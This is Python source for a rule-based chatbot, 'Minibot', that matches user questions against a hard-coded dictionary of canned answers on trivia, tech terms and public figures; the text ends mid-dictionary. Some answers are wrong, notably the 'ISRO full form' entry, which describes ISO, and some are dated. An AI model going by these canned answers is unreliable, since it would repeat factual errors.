import re, sys, sqlite3
from datetime import datetime, timedelta
import json

# Function to load the chatbot's memory (learned responses)
def load_memory():
    try:
        with open('chatbot_memory.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

# Function to save chatbot's memory
def save_memory(memory):
    with open('chatbot_memory.json', 'w') as file:
        json.dump(memory, file, indent=4)

# Chatbot response function with learned responses
def get_response(user_input, memory):
    if user_input in memory:
        return memory[user_input]
    else:
        return "Sorry, I don't understand that. Could you rephrase?"

# Function to update memory with new responses
def learn_response(user_input, response, memory):
    memory[user_input] = response
    save_memory(memory)
    print(f"\033[34mMinibot\033[0m: Learned new response for '{user_input}'.")

def greet_user():
    print("\033[34mMinibot\033[0m: Hello! How can I assist you today? \033[32m(Type -helpme or -hm to get help)\033[0m")

def process_input(ui, memory): #ui means user input
    # Normalize user input
    ui = ui.lower().strip()

    question_responses = {
        frozenset({
            "hi",
            "hello",
            "hello?",
            "hey"
        }): "Hello! How can I assist you today?",

        frozenset({
            "how are you",
            "how are you?",
            "are you good?",
            "are you good",
        }): "I'm just a \033[34mMinibot\033[0m, but I'm doing great! How about you?",

        frozenset ({
            "how do plants make food",
            "how plants makes their food?",
            "how plants makes their food?",
            "how do plants makes their food",
            "how do plants make food"
        }): "Plants make food through photosynthesis, a process where they convert sunlight into chemical energy.",

        frozenset({
            "who is jackie chan?",
            "who is jackie chan"
        }): "Jackie Chan is a famous Hong Kong actor, martial artist, and director known for his unique blend of action and comedy. He is celebrated for performing his own stunts and has appeared in over 150 films, including the 'Rush Hour' series and 'Drunken Master.'",
        
        
        frozenset({
            "what is termux",
            "define termux",
            "tell me about termux",
            "what is termux?"
        }): "Termux is a terminal emulator for Android that provides a Linux environment, allowing you to run command-line tools and software on your device.",

        frozenset({
            "what is kernal",
            "tell me about kernal",
            "can you tell me about kernal",
            "what is kernal?",
            "tell me kernal",
            "define kernal"
        }): "A kernel is a computer program that acts as the core of an operating system (OS) and acts as a bridge between the hardware and software",

        frozenset({
            "you improved a lot",
            "you are improving",
            "you are improving alot",
            "you improved alot"
        }): "Thanks!",

        frozenset({
            "what is privacy and security",
            "what is security and privacy",
            "what is privacy and security?"
            "what is security and privacy",
            "define privacy and security",
            "define security and privacy",
            "what is privacy & security",
            "what is security & privacy",
            "what is privacy & security?",
            "what is security & privacy?"
        }): "privacy: protecting your personal information and activities from being shared without consent.\nsecurity: measures to safeguard your data, devices, and systems from unauthorized access or harm.",

        frozenset({
            "why most of the rappers are black",
            "who most rappers black",
            "why blacks dominant rap?",
            "why are most rappers from black communities?",
            "is there a reason why many rappers are black?",
            "why do black artists dominate the rap scene?",
            "is rap mainly influenced by black culture?",
            "why all american rappers are black",
            "why all rappers are black"
        }): "Rap and hip-hop originated in the 1970s in Black and Latino communities in the Bronx, New York City. It was a way to express struggles, culture, and experiences through music and poetry. Over time, this genre became deeply tied to Black culture because it reflected their societal challenges and creativity.",

        frozenset({
            "how do airplanes stay in the air?",
            "how do airplanes stay in air",
            "how do planes staysin air?",
            "how airplanes stays in the air?",
            "how airplanes stays in the air",
            "how airplanes stay in air?"
        }): "Airplanes stay in the air due to the principles of aerodynamics, primarily lift generated by the wings, which counteracts gravity.",

        frozenset({
            "is python hard",
            "is python a hard programming language",
            "is python a hard language?",
            "python a hard language?",
            "is python hard?",
            "is python hard for beginners",
            "is python easy?",
            "is python easy",
            "is python easy programming language",
            "is python a easy language",
            "is python easy to learn?",
            "is python hard to learn"
        }): "Python is generally considered one of the easiest programming languages to learn, especially for beginners, due to its simple syntax, readability, and large community of support; making it a great choice for someone new to coding.",

        frozenset({
            "how to be safe on internet",
            "how can i be safe on internet",
            "how to be safe on internet?",
            "how can i be safe on internet?",
            "how to surf secure internet",
            "how can i protect myself online?"
            "what are the best ways to stay safe on the internet?",
            "how to ensure online safety?",
            "how do i secure my internet usage?",
            "what steps should i take to be safe online?",
            "how to stay protected while browsing the web?",
            "what are tips for internet safety?",
            "how can i avoid online risks?",
            "how to keep my data secure online?",
            "how to practice safe internet habits",
            "how can i protect myself online"
            "what are the best ways to stay safe on the internet",
            "how to ensure online safety",
            "how do i secure my internet usage",
            "what steps should i take to be safe online",
            "how to stay protected while browsing the web",
            "what are tips for internet safety",
            "how can i avoid online risks",
            "how to keep my data secure online",
            "how to practice safe internet habits",
        }):'''
1. use strong passwords: make them unique and long.  
2. enable 2fa: adds extra security.  
3. avoid clicking unknown links: they might be scams.  
4. update regularly: keep software and apps up-to-date.  
5. use secure networks: avoid public wi-fi without a vpn.  
6. check website security: look for "https" before sharing any info.  
7. be cautious with personal info: share only when necessary.  
8. install antivirus: protect against malware.
9. vpn: use vpn for shady or for all websites.
10. think before you download: only download apps or files from trusted sources.
''',
        frozenset({
            "can you write python code",
            "can you write py code",
            "do you know python",
            'you know how to write python',
            "can you show me an example of python",
            "show me example of python",
            "can you write in python",
            "example of python code",
            "show me an example of python code",
        }): """
# This is a simple Python program

# Asking the user for their name
name = input("What is your name? ")

# Printing a greeting message
print(f"Hello, {name}! Welcome to Python programming.")

# Doing basic math
print("Let's do some math!")
num1 = int(input("Enter a number: "))
num2 = int(input("Enter another number: "))
sum = num1 + num2

# Showing the result
print(f"The sum of {num1} and {num2} is {sum}.")

------------------------------
     #Example Output#
The sum of 5 and 15 is 20.
------------------------------

\n\033[34mMinibot\033[0m: Hope this Sample Code will help you to understand basics of python.""",

        frozenset ({
            "who is charles babbage?",
            "who is charles babbage"
        }): "Charles Babbage (born December 26, 1791, London, England—died October 18, 1871, London) was an English mathematician and inventor who is credited with having conceived the first automatic digital computer.",

        frozenset ({
            "how to get rich",
            'how to be rich',
            "how can i become rich?",
            "how to become rich",
            "how to be rich?",
            "how to become rich?",
            "how to be rich fast?",
            "how to be rich fast",
            "how to become rich quickly"
        }): "Getting rich fast usually involves a combination of hard work, smart investments, and sometimes luck, but it's important to focus on long-term financial goals for stability.",

        frozenset({
            "how many days are there in a week?",
            "number of days in a week",
            "how many days in a week",
            "week consists of how many days",
            "how many days are in a week"
        }): "7 days",
        frozenset({
            "what is black lives matter",
            "define me black lives matter",
            "define blacks lives matter",
            "define me black lives matter",
            "what is black lives matter?"
        }): "black lives matter (blm) is a movement started in 2013 to fight against racism, police brutality, and inequality faced by black people. it aims to promote justice, equality, and awareness about systemic discrimination.",

        frozenset({
            "what is untouchables",
            "define untouchables",
            "what is untouchable",
            "what is untouchables?"
        }): "'untouchables' refers to the lowest group in the indian caste system, also called dalits. historically, they faced severe discrimination, were excluded from society, and were given the most menial jobs. today, efforts are being made to improve their rights and social standing.",

        frozenset({
            "how many hours are there in a day?",
            "number of hours in a day",
            "how many hours in a day",
            "a day has how many hours",
            "how many hours make a day"
        }): "24 hours",

        frozenset({
            "command for backing up files",
            "what was that command for files backup?",
            "command for files backup",
            "tell me that command for files backup",
            "files backup command",
            "folder backup command ",
            "command for folder backup",
            "command for file backup",
            "command for files backup"
        }): "I think you are talking about '-bkp' this command is for backing up files.",

        frozenset({
            "what is device",
            "what is the device",
            "define device",
            "explain me device",
            "what is a device",
            "what is a device?",
            "what is the device?"
        }): "a piece of equipment or a mechanism designed to serve a special purpose or perform a special function. smartphones and other electronic devices.",

        frozenset({
            "what is github",
            "define github",
            "explain github",
            "what is the github",
            "what is github?",
            "what is the github?"
        }): "GitHub is a web-based interface that uses Git, the open source version control software that lets multiple people make separate changes to web pages at the same time.",

        frozenset({
            "what is api",
            "define api",
            "what is an api",
            "what is an api",
            "tell me about api",
            "what is api?",
            "tell me api meaning",
            "api mean",
            "api means",
            "api mean?",
            "what is an api?",
            "what is an api"
        }): "An API (Application Programming Interface) is a set of rules that allows different software applications to communicate with each other. It defines how requests and responses should be made between systems, enabling them to share data and functionality.",

        frozenset({
            "what is tcp",
            "define tcp",
            "tcp meaning",
            "tcp explanation",
            "what does tcp stand for"
        }): "TCP (Transmission Control Protocol) is a standard communication protocol used to ensure reliable transmission of data over a network. It establishes a connection, checks for errors, and ensures data is delivered in order.",
        
        frozenset({
        "what is phishing",
        "define phishing",
        "phishing meaning",
        "phishing explanation",
        "phishing attack"
        }): "Phishing is a type of cyber attack where attackers trick people into revealing sensitive information (e.g., passwords, credit card details) by pretending to be a trustworthy entity, often via fake emails or websites.",
        
        frozenset({
            "what is malware",
            "define malware",
            "malware meaning",
            "malware explanation",
            "types of malware"
        }): "Malware (short for malicious software) is software designed to harm or exploit devices, systems, or networks. Examples include viruses, worms, ransomware, and spyware.",
        
        frozenset({
            "what is ransomware",
            "what is ransomware",
            "define ransomware",
            "ransomware meaning",
            "ransomware explanation",
            "ransomware attack"
        }): "Ransomware is a type of malware that encrypts a victim's data, making it inaccessible, and demands payment (a ransom) to restore access.",
        
        frozenset({
            "what is trojan",
            "define trojan",
            "trojan meaning",
            "trojan explanation",
            "what is trojan horse"
        }): "A Trojan (or Trojan Horse) is a type of malware that disguises itself as legitimate software but performs malicious actions, like stealing data or opening backdoors to systems.",
        
        frozenset({
            "what is ddos",
            "define ddos",
            "ddos meaning",
            "ddos attack explanation",
            "what does ddos stand for"
        }): "DDoS (Distributed Denial of Service) is an attack where multiple systems flood a server, website, or network with traffic, causing it to become unavailable for legitimate users.",
        
        frozenset({
            "what is spyware",
            "define spyware",
            "spyware meaning",
            "spyware explanation",
            "spyware attack"
        }): "Spyware is a type of malware that secretly monitors and collects information about a user's activities, such as keystrokes, browsing habits, or personal data, often without their consent.",
        
        frozenset({
            "what is social engineering",
            "define social engineering",
            "social engineering meaning",
            "social engineering attack explanation",
            "social engineering techniques"
        }): "Social engineering is a tactic used by attackers to manipulate or deceive individuals into revealing confidential information or performing specific actions, often by exploiting human psychology.",
        
        frozenset({
            "what is dns",
            "define dns",
            "dns meaning",
            "dns explanation",
            "dns full form"
        }): "DNS (Domain Name System) translates human-readable domain names (like www.example.com) into IP addresses that computers use to identify each other on the network.",
        
        frozenset({
            "list of cryptocurrencies",
            "types of cryptocurrencies",
            "what are the cryptocurrencies",
            "name some cryptocurrencies",
            "different types of cryptocurrency",
            "examples of cryptocurrencies",
            "cryptocurrency list",
            "popular cryptocurrencies",
            "most common cryptocurrencies",
            "cryptocurrencies names",
            "cryptocurrency examples"
        }): "Popular cryptocurrencies include Bitcoin (BTC), Ethereum (ETH), Binance Coin (BNB), Ripple (XRP), Cardano (ADA), Solana (SOL), and Dogecoin (DOGE).",

        frozenset({
            "what is ftp",
            "define ftp",
            "ftp meaning",
            "ftp explanation",
            "ftp full form"
        }): "FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client and a server on a computer network.",
        
        frozenset({
        "what is virtualization",
        "define virtualization",
        "virtualization meaning",
        "virtualization examples",
        "what are virtualization tools"
        }): "Virtualization is the process of creating virtual versions of physical resources, such as servers, storage devices, or networks. It allows multiple operating systems or applications to run on the same hardware independently.",
        
        frozenset({
            "what is vmware",
            "define vmware",
            "vmware meaning",
            "vmware explanation",
            "use of vmware"
        }): "VMware is a leading provider of virtualization software that allows you to create and manage virtual machines on physical hardware, supporting multiple operating systems on the same device.",
        
        frozenset({
            "what is virtualbox",
            "define virtualbox",
            "virtualbox meaning",
            "virtualbox explanation",
            "use of virtualbox"
        }): "VirtualBox is an open-source virtualization tool that enables you to run multiple operating systems simultaneously on your computer, ideal for personal and professional use.",
        
        frozenset({
            "what is docker",
            "define docker",
            "docker meaning",
            "docker explanation",
            "use of docker"
        }): "Docker is a containerization platform that allows developers to package applications and their dependencies into lightweight, portable containers, ensuring consistency across different environments.",

        frozenset({
            "what is aws",
            "define aws",
            "aws meaning",
            "aws full form",
            "aws explanation"
        }): "AWS (Amazon Web Services) is a cloud computing platform that provides on-demand IT resources and services like storage, databases, and computing power on a pay-as-you-go basis.",
        
        frozenset({
            "what is google cloud",
            "define google cloud",
            "google cloud meaning",
            "google cloud explanation",
            "google cloud full form"
        }): "Google Cloud is a suite of cloud computing services offered by Google. It provides infrastructure, platform, and software solutions for storage, AI, analytics, and app development.",

        frozenset({
            "name the place known as the roof of the world?",
            "what place is known as the roof of the world",
            "which place is known as the roof of the world",
            "roof of the world place"
        }): "Tibet.",

        frozenset({
            "who was the first prime minister of india?",
            "first prime minister of india",
            "name the first prime minister of india",
            "who is the first prime minister of india"
        }): "Pandit Jawaharlal Nehru.",

        frozenset({
            "who is the first woman prime minister of india?",
            "name the first woman prime minister of india",
            "first woman prime minister of india",
            "who is india's first woman prime minister"
        }): "Indira Gandhi.",

        frozenset({
            "who is the first citizen of india?",
            "first citizen of india",
            "who is the first citizen of india"
        }): "The President of India.",

        frozenset({
            "how many states are there in india?",
            "number of states in india",
            "how many states in india"
        }): "28 states.",

        frozenset({
            "how many union territories are there in india?",
            "number of union territories in india",
            "how many union territories in india"
        }): "8 Union Territories.",

        frozenset({
            "how many years are there in one millennium?",
            "years in a millennium",
            "how many years are in a millennium"
        }): "1,000 years.",

        frozenset({
            "name the first man to walk on the moon?",
            "who was the first man to walk on the moon",
            "first man to walk on the moon"
        }): "Neil Armstrong.",

        frozenset({
            "name the oceans of the world?",
            "oceans of the world",
            "what are the oceans of the world"
        }): "The Atlantic, Pacific, Indian, Arctic, and the Southern (Antarctic) oceans.",

        frozenset({
            "name the densest jungle in the world?",
            "what is the densest jungle in the world",
            "which is the densest jungle in the world"
        }): "The Amazon rainforest.",

        frozenset({
            "which festival is called the festival of colours?",
            "name the festival called the festival of colours",
            "what is the festival of colours"
        }): "Holi.",

        frozenset({
            "what is the isosceles triangle?",
            "isosceles triangle",
            "name the isosceles triangle"
        }): "A triangle in which two sides have the same length or two sides are equal.",

        frozenset({
            "what type of gas is absorbed by plants?",
            "gas absorbed by plants",
            "which gas do plants absorb"
        }): "Carbon Dioxide.",

        frozenset({
            "how many days a february month have in the leap year?",
            "how many days does february have in a leap year",
            "days in february during leap year"
        }): "29 days.",

        frozenset({
            "name the longest river on the earth?",
            "longest river on earth",
            "what is the longest river in the world"
        }): "Nile.",

        frozenset({
            "name the smallest continent?",
            "what is the smallest continent",
            "smallest continent"
        }): "Australia.",

        frozenset({
            "which is the principal source of energy for the earth?",
            "principal source of energy for the earth",
            "what is the principal source of energy for the earth"
        }): "Sun.",

        frozenset({
            "anti-clockwise is it from left or right?",
            "is anti-clockwise from left or right",
            "anti-clockwise direction"
        }): "Left.",

        frozenset({
            "name the planet nearest to the earth?",
            "planet nearest to the earth",
            "which planet is nearest to the earth"
        }): "Mercury.",

        frozenset({
            "which festival is known as the festival of light?",
            "name the festival known as the festival of light",
            "what is the festival of light"
        }): "Diwali.",

        frozenset({
            "name a bird that lays the largest eggs?",
            "bird that lays the largest eggs",
            "which bird lays the largest eggs"
        }): "Ostrich.",

        frozenset({
            "which is the national aquatic animal of india?",
            "national aquatic animal of india",
            "name the national aquatic animal of india"
        }): "River Dolphin.",

        frozenset({
            "name the national heritage animal of india?",
            "national heritage animal of india",
            "which is the national heritage animal of india"
        }): "Elephant.",

        frozenset({
            "which is the tallest mountain in the world?",
            "tallest mountain in the world",
            "name the tallest mountain in the world"
        }): "Mount Everest.",

        frozenset({
            "who invented radio?",
            "inventor of radio",
            "name the inventor of radio"
        }): "Guglielmo Marconi is known as the father of radio.",

        frozenset({
            "how many vowels are there in the english alphabet and name them?",
            "how many vowels in the english alphabet and name them",
            "how many vowels are there in english alphabet",
            "name the vowels in english alphabet",
            "how many vowels are there in the english alphabet"
        }): "5 vowels namely a, e, i, o, and u.",

        frozenset({
            "which animal is known as the king of the jungle?",
            "what animal is known as the king of the jungle",
            "who is known as the king of the jungle",
            "which animal is called the king of the jungle",
            "king of jungle animal"
        }): "The Lion is known as the king of the jungle.",

        frozenset({
            "name the national bird of india?",
            "what is the national bird of india",
            "national bird of india",
            "which is the national bird of india"
        }): "The Peacock.",

        frozenset({
            "name the national animal of india?",
            "what is the national animal of india",
            "national animal of india",
            "which is the national animal of india"
        }): "Tiger.",

        frozenset({
            "what is the national anthem of india?",
            "name the national anthem of india",
            "national anthem of india",
            "which is the national anthem of india"
        }): "The National Anthem of India is Jana Gana Mana.",

        frozenset({
            "name the national flower of india?",
            "what is the national flower of india",
            "national flower of india",
            "which is the national flower of india"
        }): "Lotus flower.",

        frozenset({
            "name the national fruit of india?",
            "what is the national fruit of india",
            "national fruit of india",
            "which is the national fruit of india"
        }): "Mango.",

        frozenset({
            "what is the national song of india?",
            "name the national song of india",
            "national song of india",
            "which is the national song of india",
            "national anthem of india"
        }): "Vande Mataram.",

        frozenset({
            "who designed the national flag of india?",
            "designer of the national flag of india",
            "who is the designer of the national flag of india",
            "who created the national flag of india",
            "who created flag of india",
            "who created the flag of india",
            "who created flag of india?",
            "who created the flag of india?"
        }): "The flag was designed by Pingali Venkayya.",

        frozenset({
            "name the national game of india?",
            "what is the national game of india",
            "national game of india",
            "which is the national game of india",
            "name the national game of india",
            "what is the national game of india?",
            "national game of india?",
            "which is the national game of india?"
        }): "India does not have an official National Game.",

        frozenset({
            "name the national tree of india?",
            "what is the national tree of india",
            "national tree of india",
            "which is the national tree of india",
            "national tree of india?"
        }): "Banyan tree.",

        frozenset({
            "name the national river of india?",
            "what is the national river of india",
            "national river of india",
            "which is the national river of india"
        }): "Ganga.",

        frozenset({
            "name the national reptile of india?",
            "what is the national reptile of india",
            "national reptile of india",
            "which is the national reptile of india"
        }): "King Cobra.",

        frozenset({
            "what is the capital of india?",
            "capital of india",
            "which is the capital of india",
            "name the capital of india"
        }): "New Delhi.",

        frozenset({
            "name the biggest continent in the world?",
            "what is the biggest continent in the world",
            "biggest continent",
            "biggest continent in the world"
            "which is the biggest continent in the world"
        }): "Asia.",

        frozenset({
            "how many continents are there in the world?",
            "number of continents in the world",
            "how many continents exist in the world",
            "total number of continents?",
            "total number of continents"
        }): "7 continents.",

        frozenset({
            "name the primary colours?",
            "what are the primary colours",
            "what is the primary colour",
            "which are the primary colours",
            "primary colors",
            "primary colours",
        }): "Red, Yellow, and Blue.",

        frozenset({
            "what is isro full form",
            "isro full form",
            "full form of isro",
            "full form of isro",
            "what is the full form of isro"
        }): "ISO stands for International Organization for Standardization. It is an independent, non-governmental international organization that develops and publishes standards.",

        frozenset({
            "which is the smallest month of the year?",
            "name the smallest month of the year",
            "which is the smallest month of the year",
            "name the smallest month of the year?"
            "smallest month"
        }): "February.",

        frozenset({
            "name the house made of ice?",
            "what is the house made of ice",
            "house made of ice",
            "which house is made of ice",
            "which house is made of ice"
        }): "Igloo.",

        frozenset({
            "which colour symbolises peace?",
            "peace colour",
            "colour symbolising peace"
        }): "White.",

        frozenset({
            "name the largest mammal?",
            "what is the largest mammal",
            "largest mammal"
        }): "Blue Whale.",

        frozenset({
            "sun rises in the.....",
            "where does the sun rise",
            "sun rise direction"
        }): "East.",

        frozenset({
            "how many sides are there in a triangle?",
            "number of sides in a triangle",
            "sides of a triangle"
        }): "Three.",

        frozenset({
            "what is looksmaxxing",
            "explain looksmaxxing",
            "define looksmaxxing",
            "what is looksmaxxing",
            "looks maxxing",
            "what is looksmaxxing?",
            "what is looks maxxing",
            "what is looks maxxing?",
            "tell me what is looksmaxxing",
            "tell me what is looksmaxxing?",
        }):"Looksmaxxing is the process of improving your physical appearance through grooming, fitness, skincare, fashion, or even cosmetic procedures, with the goal of looking your best.",

        frozenset({
            "what is genx",
            "what is gen-x",
            "what is genx?",
            "what is gen-x?",
            "explain genx",
            "explain gen-x",
            "define gen-x",
            "define genx",
            "what is millenials",
            "what is millenials?",
            "define millenials",
            "explain millenials"
        }): "Generation X (Gen X) includes those born between approximately 1965 and 1980. They are known for their independence, having grown up with limited technology, and they value work-life balance.",

        frozenset({
            "what is genz",
            "what is gen-z",
            "what is genz?",
            "what is gen-z?",
            "explain genz",
            "explain gen-z",
            "define gen-z",
            "define genz",
            "who are genz",
            "who are gen-z"
        }): "Generation Z (Gen Z) includes those born between 1997 and 2012. They are digital natives, grew up with smartphones and social media, and are known for being socially conscious.",

        frozenset({
            "what is alpha personality",
            "what is alpha male",
            "what is alpha female",
            "define alpha personality",
            "explain alpha personality",
            "what does alpha personality mean",
            "who is an alpha person"
        }): "An Alpha personality is often characterized by strong leadership, confidence, assertiveness, and a dominant presence. Alphas are typically seen as natural leaders who are competitive and strive for success.",

        frozenset({
            "what is sigma personality",
            "what is sigma male",
            "what is sigma female",
            "define sigma personality",
            "explain sigma personality",
            "what does sigma personality mean",
            "who is a sigma person"
        }): "A Sigma personality refers to individuals who are independent, self-reliant, and avoid traditional societal hierarchies. They prefer to operate alone or in their own way rather than seeking leadership roles like Alphas.",

        frozenset({
            "what is beta personality",
            "what is beta male",
            "what is beta female",
            "define beta personality",
            "explain beta personality",
            "what does beta personality mean",
            "who is a beta person"
        }): "A Beta personality is often seen as more passive and supportive, characterized by a willingness to follow leadership, avoid conflict, and maintain harmony in relationships. They are often more introverted than Alphas.",

        frozenset({
            "what is gamma personality",
            "what is gamma male",
            "what is gamma female",
            "define gamma personality",
            "explain gamma personality",
            "what does gamma personality mean",
            "who is a gamma person"
        }): "A Gamma personality refers to individuals who are often considered intellectuals or unconventional. They don't follow traditional societal norms and may reject labels like Alpha or Beta.",

        frozenset({
            "what is apple",
            "what is apple inc",
            "what is apple company",
            "define apple",
            "explain apple",
            "who owns apple",
            "who founded apple"
        }): "Apple Inc. is an American multinational technology company that designs, manufactures, and markets consumer electronics, software, and services, known for products like the iPhone, Mac, iPad, and Apple Watch.",

        frozenset({
            "what is microsoft",
            "what is microsoft corp",
            "what is microsoft company",
            "define microsoft",
            "explain microsoft",
            "who owns microsoft",
            "who founded microsoft"
        }): "Microsoft is an American multinational technology company that develops, licenses, and sells computer software, hardware, and services, best known for the Windows operating system and products like Office and Xbox.",

        frozenset({
            "what is google",
            "what is google llc",
            "what is google company",
            "define google",
            "explain google",
            "who owns google",
            "who founded google"
        }): "Google LLC is an American multinational technology company specializing in internet services and products, including search, advertising, cloud computing, and software, with its most famous product being the Google Search engine.",

        frozenset({
            "what is tesla",
            "what is tesla inc",
            "what is tesla company",
            "define tesla",
            "explain tesla",
            "who owns tesla",
            "who founded tesla"
        }): "Tesla Inc. is an American electric vehicle and clean energy company known for manufacturing electric cars, solar products, and energy storage solutions. It was founded by Elon Musk and others.",

        frozenset({
            "what is amazon",
            "what is amazon inc",
            "what is amazon company",
            "define amazon",
            "explain amazon",
            "who owns amazon",
            "who founded amazon"
        }): "Amazon.com Inc. is an American multinational technology and e-commerce company, widely known for its online retail platform, cloud computing services (AWS), and innovations like Amazon Prime and Alexa.",

        frozenset({
            "what is facebook",
            "what is meta",
            "what is facebook company",
            "define facebook",
            "explain facebook",
            "who owns facebook",
            "who founded facebook"
        }): "Facebook, now Meta, is an American multinational technology conglomerate best known for its social media platforms, including Facebook, Instagram, and WhatsApp. It was founded by Mark Zuckerberg and others.",

        frozenset({
            "what is netflix",
            "what is netflix inc",
            "what is netflix company",
            "define netflix",
            "explain netflix",
            "who owns netflix",
            "who founded netflix"
        }): "Netflix Inc. is an American subscription-based streaming service that offers a wide range of TV shows, movies, documentaries, and original content.",

        frozenset({
            "what is samsung",
            "what is samsung electronics",
            "what is samsung company",
            "define samsung",
            "explain samsung",
            "who owns samsung",
            "who founded samsung"
        }): "Samsung is a South Korean multinational conglomerate, primarily known for its electronics products like smartphones, TVs, and home appliances, as well as for its work in technology and construction.",

        frozenset({
            "what is sony",
            "what is sony corporation",
            "what is sony company",
            "define sony",
            "explain sony",
            "who owns sony",
            "who founded sony"
        }): "Sony Corporation is a Japanese multinational conglomerate, known for its electronics, gaming (PlayStation), and entertainment industries, including movies and music.",

        frozenset({
            "what is ibm",
            "what is ibm corp",
            "what is ibm company",
            "define ibm",
            "explain ibm",
            "who owns ibm",
            "who founded ibm"
        }): "IBM (International Business Machines) is an American multinational technology company that provides hardware, software, and consulting services, and is known for its leadership in AI and quantum computing.",

        frozenset({
            "who is leonardo dicaprio",
            "who is leonardo dicaprio?",
            "tell me about leonardo dicaprio",
            "leonardo dicaprio biography",
            "who is leonardo dicaprio in real life"
        }): "Leonardo DiCaprio is an American actor and environmental activist known for his roles in movies like Titanic, Inception, and The Revenant. He has received multiple awards, including an Academy Award for Best Actor.",

        frozenset({
            "who is taylor swift",
            "who is taylor swift?",
            "tell me about taylor swift",
            "taylor swift biography",
            "who is taylor swift in real life"
        }): "Taylor Swift is an American singer-songwriter, known for her narrative-driven music. She has won multiple Grammy Awards and is recognized for her influence on the music industry and pop culture.",

        frozenset({
            "who is priyanka chopra",
            "who is priyanka chopra?",
            "tell me about priyanka chopra",
            "priyanka chopra biography",
            "who is priyanka chopra in real life"
        }): "Priyanka Chopra is an Indian actress, singer, and film producer who made a successful transition to Hollywood. She is known for her roles in 'Quantico' and movies like 'Bajirao Mastani' and 'Don.'",

        frozenset({
            "who is messi",
            "who is messi?",
            "tell me about messi",
            "messi biography",
            "who is messi in real life"
        }): "Lionel Messi is an Argentine professional footballer widely considered one of the greatest players in the history of the sport. He has won multiple Ballon d'Or awards and played for Barcelona before moving to Paris Saint-Germain.",

        frozenset({
            "who is vanessa paradis",
            "who is vanessa paradis?",
            "tell me about vanessa paradis",
            "vanessa paradis biography",
            "who is vanessa paradis in real life"
        }): "Vanessa Paradis is a French singer, actress, and model known for her hit songs and roles in films like 'The Girl on the Bridge.' She has been a prominent figure in French pop culture.",

        frozenset({
            "who is malala yousafzai",
            "who is malala yousafzai?",
            "tell me about malala yousafzai",
            "malala yousafzai biography",
            "who is malala yousafzai in real life"
        }): "Malala Yousafzai is a Pakistani human rights activist, known for advocating girls' education. She became the youngest-ever Nobel Prize laureate in 2014 for her activism.",

        frozenset({
            "what is a laptop",
            "what is a laptop?",
            "define laptop",
            "tell me about laptop",
            "laptop explained"
        }): "A laptop is a portable computer designed for mobile use, featuring a screen, keyboard, and all the components needed to run an operating system, allowing users to work on the go.",

        frozenset({
            "what is a desktop computer",
            "what is a desktop?",
            "define desktop computer",
            "tell me about desktop computer",
            "desktop explained"
        }): "A desktop computer is a stationary personal computer designed for regular use at a desk or workstation. It typically offers more power and expandability than laptops.",

        frozenset({
            "what is a printer",
            "what is a printer?",
            "define printer",
            "tell me about printer",
            "printer explained"
        }): "A printer is a machine that produces hard copies of digital documents or images, typically by printing onto paper. It can be inkjet, laser, or other types.",

        frozenset({
            "what is a smartphone",
            "what is a smartphone?",
            "define smartphone",
            "tell me about smartphone",
            "smartphone explained"
        }): "A smartphone is a mobile phone with advanced features such as internet connectivity, apps, touchscreens, and high-quality cameras. It functions as both a phone and a portable computer.",

        frozenset({
            "what is a washing machine",
            "what is a washing machine?",
            "define washing machine",
            "tell me about washing machine",
            "washing machine explained"
        }): "A washing machine is a home appliance used to wash laundry, such as clothes, sheets, and towels, using water and detergent in a controlled environment.",

        frozenset({
            "what is a microwave",
            "what is a microwave?",
            "define microwave",
            "tell me about microwave",
            "microwave explained"
        }): "A microwave is a kitchen appliance that uses microwave radiation to heat or cook food quickly. It's commonly used for reheating leftovers or making simple meals.",

        frozenset({
            "what is a refrigerator",
            "what is a refrigerator?",
            "define refrigerator",
            "tell me about refrigerator",
            "refrigerator explained"
        }): "A refrigerator is an appliance used to store food at low temperatures to prevent spoilage. It typically uses refrigeration to keep items cool or frozen.",

        frozenset({
            "what is a vacuum cleaner",
            "what is a vacuum cleaner?",
            "define vacuum cleaner",
            "tell me about vacuum cleaner",
            "vacuum cleaner explained"
        }): "A vacuum cleaner is a device used for cleaning by suction. It removes dirt, dust, and debris from floors, carpets, and other surfaces.",

        frozenset({
            "what is a drone",
            "what is a drone?",
            "define drone",
            "tell me about drone",
            "drone explained"
        }): "A drone is an unmanned aerial vehicle (UAV) used for various purposes, such as aerial photography, delivery, and surveillance. Drones can be remotely controlled or autonomous.",

        frozenset({
            "what is a 3d printer",
            "what is a 3d printer?",
            "define 3d printer",
            "tell me about 3d printer",
            "3d printer explained"
        }): "A 3D printer is a machine that creates three-dimensional objects by adding material layer by layer based on a digital model. It’s widely used in manufacturing and prototyping.",

        frozenset({
            "what is a robot",
            "what is a robot?",
            "define robot",
            "tell me about robot",
            "robot explained"
        }): "A robot is a machine designed to carry out tasks autonomously or semi-autonomously, often through programmable control systems. Robots are used in industries, homes, and even in space exploration.",

        frozenset({
            "what is a blender",
            "what is a blender?",
            "define blender",
            "tell me about blender",
            "blender explained"
        }): "A blender is a kitchen appliance used to mix, puree, or emulsify food and liquids. It typically consists of a motorized base with a rotating blade in a container.",

        frozenset({
            "what is a camera",
            "what is a camera?",
            "define camera",
            "tell me about camera",
            "camera explained"
        }): "A camera is a device used to capture images or videos, either digitally or on film. It is commonly used in photography, film, and digital media.",

        frozenset({
            "what is a treadmill",
            "what is a treadmill?",
            "define treadmill",
            "tell me about treadmill",
            "treadmill explained"
        }): "A treadmill is a fitness machine used for walking, jogging, or running indoors. It features a moving belt that allows users to exercise in place.",

        frozenset({
            "what is a sewing machine",
            "what is a sewing machine?",
            "define sewing machine",
            "tell me about sewing machine",
            "sewing machine explained"
        }): "A sewing machine is a mechanical device used to stitch fabric together using a needle and thread. It's commonly used in textile and fashion industries.",

        frozenset({
            "who is emma watson",
            "who is emma watson?",
            "tell me about emma watson",
            "emma watson biography",
            "who is emma watson in real life"
        }): "Emma Watson is an English actress, best known for her role as Hermione Granger in the Harry Potter series. She is also a prominent activist for women's rights and gender equality.",

        frozenset({
            "who is drake",
            "who is drake?",
            "tell me about drake",
            "drake biography",
            "who is drake in real life"
        }): "Drake is a Canadian rapper, singer, and songwriter known for his chart-topping hits like 'Hotline Bling' and 'God's Plan.' He is a major influence in hip-hop and contemporary music.",

        frozenset({
            "who is akshay kumar",
            "who is akshay kumar?",
            "tell me about akshay kumar",
            "akshay kumar biography",
            "who is akshay kumar in real life"
        }): "Akshay Kumar is an Indian actor and producer who has appeared in over 150 films, primarily in the Hindi film industry. He is known for his versatile roles in action, comedy, and drama films.",

